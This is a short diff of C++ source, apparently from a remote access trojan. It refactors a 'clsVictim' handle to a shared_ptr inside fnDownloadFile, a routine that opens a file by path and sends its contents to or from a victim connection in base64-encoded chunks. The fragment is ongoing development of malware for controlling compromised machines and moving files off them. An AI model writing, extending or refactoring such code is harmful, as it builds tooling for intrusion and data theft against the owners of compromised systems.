@@ -224,7 +224,7 @@ public:
         return { nCode, szMsg };
     }
 
-    void fnDownloadFile(clsVictim& victim, const std::string& szFilePath, size_t nChunkSize)
+    void fnDownloadFile(std::shared_ptr<clsVictim> victim, const std::string& szFilePath, size_t nChunkSize)
     {
         std::ifstream file(szFilePath, std::ios::binary);
         if (!file)
@@ -235,7 +235,7 @@ public:
                 "Open file failed.",
             };
 
-            victim.fnSendCommand(ls);
+            victim->fnSendCommand(ls);
 
             return;
         }
@@ -260,7 +260,7 @@ public:
                 clsEZData::fnb64EncodeUtf8(abData),
             };
 
-            victim.fnSendCommand(ls);
+            victim->fnSendCommand(ls);
             
             nIdx++;
         }
